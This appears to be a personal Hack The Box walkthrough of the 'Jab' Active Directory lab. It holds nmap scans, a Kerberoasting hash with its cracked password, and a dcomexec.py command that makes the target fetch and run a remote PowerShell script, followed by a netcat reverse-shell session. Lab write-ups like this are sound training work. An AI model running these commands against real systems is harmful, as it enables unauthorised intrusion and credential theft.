


XMPP???
Jabber???



run kerbrute with wordlist from office


```
kali@kali ~> nmap -sC -sV -Pn -T4 10.10.11.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 18:01 EST
Warning: 10.10.11.4 giving up on port because retransmission cap hit (6).
Stats: 0:02:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 48.56% done; ETC: 18:05 (0:02:12 remaining)
Nmap scan report for jab.htb (10.10.11.4)
Host is up (0.76s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT      STATE    SERVICE         VERSION
53/tcp    open     domain          Simple DNS Plus
88/tcp    open     spark           Apache Spark    <------------------------- DOMAIN CONTROLLER CUZ KURBEROS IS HERE
135/tcp   open     msrpc           Microsoft Windows RPC
139/tcp   open     netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http      Microsoft Windows RPC over HTTP 1.0
3268/tcp  open     ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name) <--------------- DOMAIN CONTROLLER PORTS
|_ssl-date: 2024-02-25T23:07:22+00:00; -26s from scanner time.
3269/tcp  open     ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name) <--------------- DOMAIN CONTROLLER PORTS
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5222/tcp  open     jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: TLS randomness does not represent time    <------------------------------------------- pay attention
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
|     stream_id: g7iuq53hx
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     auth_mechanisms: 
|_    features: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5269/tcp  open     tcpwrapped
| xmpp-info: 
|   Respects server name
|   info: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|   pre_tls: 
|     xmpp: 
|     capabilities: 
|     features: 
|       Server Dialback
|       TLS
|   post_tls: 
|     xmpp: 
|       lang: en-US
|_    capabilities: 
7007/tcp  filtered afs3-bos
7070/tcp  open     tcpwrapped
7443/tcp  open     tcpwrapped
7777/tcp  open     socks5
32780/tcp filtered sometimes-rpc23
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -16s, deviation: 13s, median: -26s
| smb2-time: 
|   date: 2024-02-25T23:07:04
|_  start_date: N/A

```


1. domain controller so impacket is in scope
2. 


nmap 2


```
kali@kali ~> nmap -A -sC --open -p- -Pn -T4 10.10.11.4
Nmap scan report for jab.htb (10.10.11.4)
Host is up (0.14s latency).
Not shown: 52103 filtered tcp ports (no-response), 13426 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-26 00:37:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-26T00:37:47+00:00; -6s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5275/tcp open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     features: 
|     stream_id: 9fe0q3cnqs
|     compression_methods: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|_    auth_mechanisms: 
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5275-TCP:V=7.94SVN%I=7%D=2/25%Time=65DBDD50%P=x86_64-pc-linux-gnu%r
SF:(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.or
SF:g/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-str
SF:eams\"/></stream:error></stream:stream>");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6s, deviation: 0s, median: -6s
| smb2-time: 
|   date: 2024-02-26T00:37:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4646.60 seconds

```



```
kali@kali ~> nmap 10.10.11.4 -sC -A -Pn -p 7777
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 18:45 EST
Nmap scan report for jab.htb (10.10.11.4)
Host is up (0.36s latency).

PORT     STATE SERVICE VERSION
7777/tcp open  socks5  (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.73 seconds

```





# Mistakes

## MISTAKE 1

WRONG READ WE DONT NEED PROXY BCAUSE IF U SCANNED PROPERLY YOU WOULD KNOW

![[Jabber-20240226023109936.webp]]



```
(11/21/2023 01:49:50 PM) bdavis: <img src="data:image/png;base64,VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==" alt="some text" />
(11/21/2023 01:50:09 PM) bdavis: 

(11/21/2023 01:49:24 PM) The topic is: 
```



so after that I made a mistake by not enumerating the application carefully, i wasnt looking good enough. carefully enough and treating it like an actual application, i **need** that gamesense or else i will go fucking insane. the msitake was that there was a users tab where i could enumerate the existing users and I did NOT carefully pick out every single fucking option and see and explore everything


second of all i didnt respect the box and looked at the writeup a little peeking at it, i didnt think about doing credential re-use (for some reason) on the application despite it being the entire purpose. try. harder. stop. giving. **up**.



```
(11/21/2023 01:31:13 PM) adunn: team, we need to finalize post-remediation testing from last quarter's pentest. @bdavis Brian can you please provide us with a status?
(11/21/2023 01:33:58 PM) bdavis: sure. we removed the SPN from the svc_openfire account. I believe this was finding #2. can someone from the security team test this? if not we can send it back to the pentesters to validate. 
(11/21/2023 02:30:41 PM) bdavis: here are the commands from the report, can you find someone from the security team who can re-run these to validate? 
(11/21/2023 02:30:43 PM) bdavis: $ GetUserSPNs.py -request -dc-ip 192.168.195.129 jab.htb/hthompson
 
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation
 
Password:
ServicePrincipalName  Name          MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  ------------  --------  --------------------------  ---------  ----------
http/xmpp.jab.local   svc_openfire            2023-10-27 15:23:49.811611  <never>               
 
 
 
[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$b1abbb2f4beb2a48e7412ccd26b60e61$864f27ddaaded607ab5efa59544870cece4b6262e20f3bee38408d296ffbf07ceb421188b9b82ac0037ae67b488bb0ef2178a0792d62<SNIP>

(11/21/2023 02:30:56 PM) bdavis: $ hashcat -m 13100 svc_openfire_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&*(1qazxsw
```


![[Jabber-20241016030824738.webp]]

so looking things up

https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#dcomexecpy
https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/



```
kali@kali ~> dcomexec.py -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell.exe (new-object system.net.webclient).downloadstring(\'http://10.10.14.31/shell.ps1\') | IEX'
/usr/local/bin/dcomexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'dcomexec.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.12.0-py3.11.egg/impacket
[+] Target system is 10.10.11.4 and isFQDN is False
[+] StringBinding: DC01[51002]
[+] StringBinding: 10.10.11.4[51002]
[+] StringBinding chosen: ncacn_ip_tcp:10.10.11.4[51002]

```

basically setup a powershell reverse shell and also got call back!

```
kali@kali ~> rlwrap -crA nc -lvnp 6721
listening on [any] 6721 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.11.4] 51004
whoami
jab\svc_openfire
cd ..

cd ..

cd ..

ls
PerfLogs Program Files Program Files (x86) Users Windows .rnd
cd Users

ls
Administrator Public svc_openfire
cd svc_openfire

ls
3D Objects Contacts Desktop Documents Downloads Favorites Links Music Pictures Saved Games Searches Videos
cd Desktop

ls
user.txt
type user.txt
b0789c6587c9a70d897176aeda1e9763

```





## winpeas, road to root


























---



SOLUTION

```
kali@kali ~> nmap 10.10.11.4 -sC -A -Pn -p 7777
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 18:45 EST
Nmap scan report for jab.htb (10.10.11.4)
Host is up (0.36s latency).

PORT     STATE SERVICE VERSION
7777/tcp open  socks5  (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
```

if it doesnt work now, it might work later. remember the fishhook method


# MISTAKE 2




read error

```
kali@kali ~> curl -x socks5://10.10.11.4:7777
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
kali@kali ~ [2]> curl --socks5 10.10.11.4:7777 
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
kali@kali ~ [2]> curl -x socks5:10.10.11.4:7777
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
kali@kali ~ [2]> curl -x socks5:10.10.11.4:7777
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
kali@kali ~ [2]> curl -x socks5://10.10.11.4:7777 
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
kali@kali ~ [2]> curl http://google.com -x socks5://10.10.11.4:7777 
^C⏎                                                                                                             kali@kali ~ [SIGINT]> curl http://10.10.11.4 -x socks5://10.10.11.4:7777
curl: (97) connection to proxy closed

```





## Lessons learnt


"How to hack"
"How to Pentest"

doesnt always work

look at the documentation to understand what it does before the attempts and then game sense will carry (?)


kerbrute enum users + asrep roasting(easiest win when it comes to AD), look for easy wins and then do the usual

null authen, anonymous



